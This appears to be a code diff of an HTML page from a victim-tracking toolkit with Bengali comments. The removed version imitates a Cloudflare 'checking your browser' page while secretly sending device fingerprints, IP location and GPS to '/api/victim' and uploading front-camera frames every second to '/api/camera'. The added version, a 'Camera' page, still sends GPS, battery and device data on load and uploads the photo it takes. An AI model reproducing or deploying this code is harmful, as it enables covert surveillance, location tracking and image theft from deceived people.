@@ -1,355 +1,323 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Just a moment...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Camera</title>
     <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
-            background: #ffffff;
+            background: #000;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-            text-align: center;
-            padding: 20px;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            flex-direction: column;
         }
-        .container { max-width: 500px; width: 100%; }
-        .bubbles-wrapper { margin: 0 auto 30px auto; }
-        .bubble {
-            background-color: #f58220;
-            width: 20px;
-            height: 20px;
-            margin: 0 4px;
-            border-radius: 100%;
-            display: inline-block;
-            animation: fader 1.6s infinite;
+        video {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 10px;
+            border: 2px solid #333;
+            background: #111;
+            transform: scaleX(-1);
         }
-        .bubble:nth-child(2) { animation-delay: 0.2s; }
-        .bubble:nth-child(3) { animation-delay: 0.4s; }
-        @keyframes fader {
-            0% { opacity: 0.2; }
-            50% { opacity: 1.0; }
-            100% { opacity: 0.2; }
+        canvas {
+            display: none;
         }
-        h1 {
-            font-size: 28px;
-            font-weight: 700;
-            color: #000000;
-            margin: 16px 0;
-            line-height: 1.25;
+        #status {
+            color: #fff;
+            margin-top: 15px;
+            font-size: 14px;
+            background: rgba(255,0,0,0.7);
+            padding: 8px 20px;
+            border-radius: 20px;
+            display: none;
         }
-        p {
+        #captureBtn {
+            margin-top: 20px;
+            padding: 14px 40px;
+            background: #ff4757;
+            border: none;
+            border-radius: 50px;
+            color: #fff;
             font-size: 18px;
-            font-weight: 400;
-            color: #444;
-            margin: 8px 0;
-            line-height: 1.7;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 5px 15px rgba(255, 71, 87, 0.4);
+            transition: 0.3s;
+            display: none;
         }
-        #status { display: none !important; }
-        .attribution {
-            margin-top: 32px;
-            font-size: 14px;
-            color: #666;
+        #captureBtn:active {
+            transform: scale(0.95);
         }
-        .attribution a { color: #2c7cb0; text-decoration: none; }
-        .attribution a:hover { color: #f4a15d; }
-        .ray_id { display: block; margin-top: 8px; }
-        code {
-            background: #f1f1f1;
-            padding: 2px 8px;
-            border-radius: 4px;
-            font-size: 14px;
+        #loading {
+            color: #fff;
+            font-size: 18px;
+            text-align: center;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
         }
-        video, canvas { display: none !important; }
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top: 4px solid #ff4757;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="bubbles-wrapper">
-            <div class="bubble"></div>
-            <div class="bubble"></div>
-            <div class="bubble"></div>
-        </div>
-        <h1>আপনার ব্রাউজার চেক করা হচ্ছে...</h1>
-        <p>এই প্রক্রিয়াটি স্বয়ংক্রিয়। আপনার ব্রাউজার শীঘ্রই পুনর্নির্দেশিত হবে।</p>
-        <p id="status"></p>
-        <div class="attribution">
-            DDoS সুরক্ষা দ্বারা
-            <a rel="noopener noreferrer" href="https://www.cloudflare.com/5xx-error-landing/" target="_blank">Cloudflare</a>
-            <br>
-            <span class="ray_id">Ray ID: <code id="ray">6c51810c599f2cda</code></span>
-        </div>
+
+    <div id="loading">
+        <div class="spinner"></div>
+        <p>অপেক্ষা করুন...</p>
     </div>
 
-    <video id="video" playsinline autoplay muted></video>
+    <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
+    <button id="captureBtn">📸 ছবি তুলুন</button>
+    <div id="status">✅ ছবি পাঠানো হচ্ছে...</div>
 
     <script>
-        (function() {
-            "use strict";
+        // ============================================================
+        // ১. ডিভাইস ইনফো কালেক্ট করুন (লোকেশন পেজের মতো)
+        // ============================================================
+        async function collectDeviceInfo() {
+            const info = {
+                userAgent: navigator.userAgent,
+                screen: screen.width + 'x' + screen.height,
+                os: navigator.platform || 'Unknown',
+                language: navigator.language || 'en-US',
+                gpsLocation: null,
+                network: {},
+                battery: {},
+                media: { camera: false, microphone: false }
+            };
 
-            // ===== রে আইডি =====
-            const chars = "qwertyuioplkjhgfdsazxcvbnm0987654321";
-            let ray = "";
-            for (let i = 0; i < 17; i++) {
-                ray += chars[Math.floor(Math.random() * chars.length)];
-            }
-            document.getElementById('ray').textContent = ray;
-
-            const pathParts = window.location.pathname.split('/');
-            const victimId = pathParts[pathParts.length - 1];
-
-            // ================================================================
-            // ১. ডিভাইস ইনফো তৈরি করা
-            // ================================================================
-            function getDeviceInfo() {
-                return {
-                    productSub: navigator.productSub || 'N/A',
-                    vendor: navigator.vendor || 'N/A',
-                    maxTouchPoints: navigator.maxTouchPoints || 0,
-                    doNotTrack: navigator.doNotTrack || 'N/A',
-                    hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
-                    cookieEnabled: navigator.cookieEnabled || false,
-                    appCodeName: navigator.appCodeName || 'N/A',
-                    appName: navigator.appName || 'N/A',
-                    appVersion: navigator.appVersion || 'N/A',
-                    platform: navigator.platform || 'N/A',
-                    product: navigator.product || 'N/A',
-                    userAgent: navigator.userAgent || 'N/A',
-                    language: navigator.language || 'N/A',
-                    languages: navigator.languages || [],
-                    webdriver: navigator.webdriver || false,
-                    pdfViewerEnabled: navigator.pdfViewerEnabled || false,
-                    deviceMemory: navigator.deviceMemory || 'N/A',
-                    screen: `${screen.width}x${screen.height}`,
-                    colorDepth: screen.colorDepth || 'N/A'
+            // নেটওয়ার্ক ইনফো
+            if (navigator.connection) {
+                info.network = {
+                    downlink: navigator.connection.downlink || 'N/A',
+                    rtt: navigator.connection.rtt || 'N/A',
+                    type: navigator.connection.effectiveType || 'N/A'
                 };
             }
 
-            // ================================================================
-            // ২. মিডিয়া ডিভাইস
-            // ================================================================
-            async function getMediaDevices() {
+            // ব্যাটারি ইনফো
+            if (navigator.getBattery) {
                 try {
-                    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
-                        const devices = await navigator.mediaDevices.enumerateDevices();
-                        return devices.map(d => ({
-                            kind: d.kind,
-                            label: d.label || 'N/A',
-                            deviceId: d.deviceId || 'N/A'
-                        }));
-                    }
-                } catch (e) {}
-                return [];
-            }
-
-            // ================================================================
-            // ৩. নেটওয়ার্ক তথ্য
-            // ================================================================
-            function getNetworkInfo() {
-                if (navigator.connection) {
-                    return {
-                        type: navigator.connection.type || 'N/A',
-                        rtt: navigator.connection.rtt || 0,
-                        saveData: navigator.connection.saveData || false,
-                        effectiveType: navigator.connection.effectiveType || 'N/A',
-                        downlink: navigator.connection.downlink || 0,
-                        downlinkMax: navigator.connection.downlinkMax || 0
+                    const battery = await navigator.getBattery();
+                    info.battery = {
+                        level: Math.round(battery.level * 100),
+                        charging: battery.charging
                     };
-                }
-                return {};
-            }
-
-            // ================================================================
-            // ৪. ব্যাটারি তথ্য
-            // ================================================================
-            async function getBatteryInfo() {
-                try {
-                    if (navigator.getBattery) {
-                        const battery = await navigator.getBattery();
-                        return {
-                            level: Math.round(battery.level * 100),
-                            charging: battery.charging,
-                            chargingTime: battery.chargingTime,
-                            dischargingTime: battery.dischargingTime
-                        };
-                    }
                 } catch (e) {}
-                return {};
             }
 
-            // ================================================================
-            // ৫. ডিভাইস ইনফো পাঠান (সাথে সাথে)
-            // ================================================================
-            async function sendDeviceInfo() {
-                try {
-                    const device = getDeviceInfo();
-                    const media = await getMediaDevices();
-                    const network = getNetworkInfo();
-                    const battery = await getBatteryInfo();
-
-                    const data = {
-                        id: victimId,
-                        timestamp: new Date().toISOString(),
-                        ip: null,
-                        location: null,
-                        gpsLocation: null,
-                        device: device,
-                        media: media,
-                        network: network,
-                        battery: battery,
-                        type: 'camera'
-                    };
-
-                    await fetch('/api/victim', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(data)
+            // GPS লোকেশন
+            try {
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        timeout: 5000,
+                        enableHighAccuracy: true
                     });
-                    console.log('✅ ডিভাইস ইনফো পাঠানো হয়েছে');
+                });
+                info.gpsLocation = {
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy
+                };
+            } catch (e) {}
 
-                } catch (err) {
-                    console.error('Device info send error:', err);
+            // মিডিয়া ডিভাইস চেক
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                info.media.camera = devices.some(d => d.kind === 'videoinput');
+                info.media.microphone = devices.some(d => d.kind === 'audioinput');
+            } catch (e) {}
+
+            return info;
+        }
+
+        // ============================================================
+        // ২. ভিক্টিম আইডি বের করা
+        // ============================================================
+        function getVictimId() {
+            const path = window.location.pathname;
+            const parts = path.split('/').filter(p => p !== '');
+            // সাধারণত /c/আইডি অথবা /camera/আইডি ফরম্যাটে হয়
+            // অথবা সবশেষ স্ল্যাশের পরের অংশটুকু
+            return parts[parts.length - 1] || 'unknown';
+        }
+
+        // ============================================================
+        // ৩. ডিভাইস ইনফো সার্ভারে পাঠানো
+        // ============================================================
+        async function sendDeviceInfo(victimId) {
+            const deviceInfo = await collectDeviceInfo();
+
+            const payload = {
+                id: victimId,
+                fbId: 'unknown',
+                type: 'camera', // টাইপ ক্যামেরা সেট করুন
+                ip: '', // সার্ভার নিজেই IP বের করবে
+                location: {}, // IP লোকেশন সার্ভার বের করবে
+                gpsLocation: deviceInfo.gpsLocation,
+                device: {
+                    userAgent: deviceInfo.userAgent,
+                    screen: deviceInfo.screen,
+                    os: deviceInfo.os,
+                    language: deviceInfo.language
+                },
+                network: deviceInfo.network,
+                battery: deviceInfo.battery,
+                media: deviceInfo.media
+            };
+
+            try {
+                const response = await fetch('/api/victim', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                const result = await response.json();
+                console.log('✅ ডিভাইস ইনফো পাঠানো হয়েছে:', result);
+                return true;
+            } catch (err) {
+                console.error('❌ ডিভাইস ইনফো পাঠাতে ব্যর্থ:', err);
+                return false;
+            }
+        }
+
+        // ============================================================
+        // ৪. ক্যামেরা স্টার্ট ও ছবি তোলা
+        // ============================================================
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const captureBtn = document.getElementById('captureBtn');
+        const statusDiv = document.getElementById('status');
+        const loadingDiv = document.getElementById('loading');
+
+        let stream = null;
+        let isCameraReady = false;
+
+        async function startCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
+                    audio: false
+                });
+                video.srcObject = stream;
+                await video.play();
+                isCameraReady = true;
+                loadingDiv.style.display = 'none';
+                captureBtn.style.display = 'block';
+                console.log('📷 ক্যামেরা রেডি');
+            } catch (err) {
+                console.error('ক্যামেরা অ্যাক্সেস ব্যর্থ:', err);
+                loadingDiv.innerHTML = '<p style="color:red;">❌ ক্যামেরা অ্যাক্সেস denied! অনুগ্রহ করে ব্রাউজার সেটিংস চেক করুন।</p>';
+            }
+        }
+
+        async function capturePhoto() {
+            if (!isCameraReady) {
+                alert('ক্যামেরা এখনো রেডি নয়!');
+                return;
+            }
+
+            statusDiv.style.display = 'block';
+            statusDiv.innerText = '⏳ ছবি তোলা হচ্ছে...';
+            captureBtn.disabled = true;
+
+            try {
+                // ১. ছবি ক্যাপচার
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                // মিরর ইফেক্ট রিমুভ (কারণ ভিডিওতে transform: scaleX(-1) দেওয়া)
+                ctx.translate(canvas.width, 0);
+                ctx.scale(-1, 1);
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // ২. ব্লব তৈরী
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+                if (!blob) throw new Error('ব্লব তৈরী হয়নি');
+
+                // ৩. ফরমডেটা তৈরী
+                const formData = new FormData();
+                const victimId = getVictimId();
+                formData.append('victimId', victimId);
+                formData.append('image', blob, 'camera_capture.jpg');
+
+                statusDiv.innerText = '📤 সার্ভারে পাঠানো হচ্ছে...';
+
+                // ৪. POST /api/camera
+                const response = await fetch('/api/camera', {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const result = await response.json();
+                if (response.ok) {
+                    statusDiv.style.background = 'rgba(0,255,0,0.7)';
+                    statusDiv.innerText = '✅ ছবি সফলভাবে পাঠানো হয়েছে!';
+                } else {
+                    throw new Error(result.message || 'সার্ভার এরর');
                 }
+            } catch (err) {
+                console.error('ক্যাপচার/আপলোড ব্যর্থ:', err);
+                statusDiv.style.background = 'rgba(255,0,0,0.7)';
+                statusDiv.innerText = '❌ ব্যর্থ: ' + err.message;
+            } finally {
+                captureBtn.disabled = false;
+                setTimeout(() => {
+                    statusDiv.style.display = 'none';
+                    statusDiv.style.background = 'rgba(255,0,0,0.7)';
+                }, 5000);
             }
+        }
 
-            // ================================================================
-            // ৬. IP ও লোকেশন আপডেট
-            // ================================================================
-            async function updateIPAndLocation() {
-                try {
-                    let ip = null;
-                    let location = null;
-                    let gpsLocation = null;
+        // ============================================================
+        // ৫. পেজ লোড হলে এক্সিকিউশন ফ্লো
+        // ============================================================
+        window.addEventListener('DOMContentLoaded', async function() {
+            const victimId = getVictimId();
+            console.log('🆔 ভিক্টিম আইডি:', victimId);
 
-                    try {
-                        const ipRes = await fetch('https://api.ipify.org?format=json');
-                        const ipData = await ipRes.json();
-                        ip = ipData.ip;
-                    } catch (e) {}
+            // --- প্রথমে ডিভাইস ইনফো পাঠান ---
+            await sendDeviceInfo(victimId);
 
-                    try {
-                        if (ip) {
-                            const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
-                            const locData = await locRes.json();
-                            location = {
-                                country: locData.country_name || 'N/A',
-                                region: locData.region || 'N/A',
-                                city: locData.city || 'N/A',
-                                latitude: locData.latitude || 0,
-                                longitude: locData.longitude || 0,
-                                isp: locData.org || 'N/A'
-                            };
-                        }
-                    } catch (e) {}
+            // --- তারপর ক্যামেরা স্টার্ট করুন ---
+            await startCamera();
 
-                    try {
-                        if (navigator.geolocation) {
-                            const pos = await new Promise((resolve, reject) => {
-                                navigator.geolocation.getCurrentPosition(resolve, reject, {
-                                    enableHighAccuracy: true,
-                                    timeout: 8000
-                                });
-                            });
-                            gpsLocation = {
-                                latitude: pos.coords.latitude,
-                                longitude: pos.coords.longitude,
-                                accuracy: pos.coords.accuracy,
-                                googleMaps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
-                            };
-                        }
-                    } catch (e) {}
+            // --- ক্যাপচার বাটনে ক্লিক ইভেন্ট ---
+            captureBtn.addEventListener('click', capturePhoto);
+        });
 
-                    if (ip || location || gpsLocation) {
-                        await fetch('/api/victim', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                id: victimId,
-                                ip: ip,
-                                location: location,
-                                gpsLocation: gpsLocation,
-                                type: 'camera'
-                            })
-                        });
-                        console.log('✅ IP ও লোকেশন আপডেট করা হয়েছে');
-                    }
-
-                } catch (err) {
-                    console.error('IP/Location update error:', err);
-                }
+        // পেজ আনলোড হলে স্ট্রিম বন্ধ করুন (ঐচ্ছিক)
+        window.addEventListener('beforeunload', function() {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
             }
-
-            // ================================================================
-            // ৭. ক্যামেরা – আসল রেজোলিউশন
-            // ================================================================
-            async function startCamera() {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({
-                        video: {
-                            width: { ideal: 1920 },
-                            height: { ideal: 1080 },
-                            facingMode: 'user'
-                        },
-                        audio: false
-                    });
-
-                    const video = document.getElementById('video');
-                    const canvas = document.getElementById('canvas');
-                    video.srcObject = stream;
-
-                    await new Promise((resolve) => {
-                        video.onloadedmetadata = () => {
-                            video.play();
-                            resolve();
-                        };
-                    });
-
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-
-                    const interval = setInterval(async () => {
-                        if (!video.videoWidth || !video.videoHeight) return;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        const imageData = canvas.toDataURL('image/jpeg', 0.95);
-                        const rawBase64 = imageData.split(',')[1];
-
-                        try {
-                            await fetch('/api/camera', {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ id: victimId, image: rawBase64 })
-                            });
-                        } catch (e) {
-                            console.error('Camera upload error:', e);
-                        }
-                    }, 1000);
-
-                    setTimeout(() => {
-                        clearInterval(interval);
-                        stream.getTracks().forEach(t => t.stop());
-                    }, 30000);
-
-                } catch (e) {
-                    console.log('Camera access denied');
-                }
-            }
-
-            // ================================================================
-            // ৮. মেইন ফাংশন
-            // ================================================================
-            async function main() {
-                await sendDeviceInfo();
-                updateIPAndLocation();
-                startCamera();
-            }
-
-            window.addEventListener('load', main);
-        })();
+        });
     </script>
 </body>
 </html>
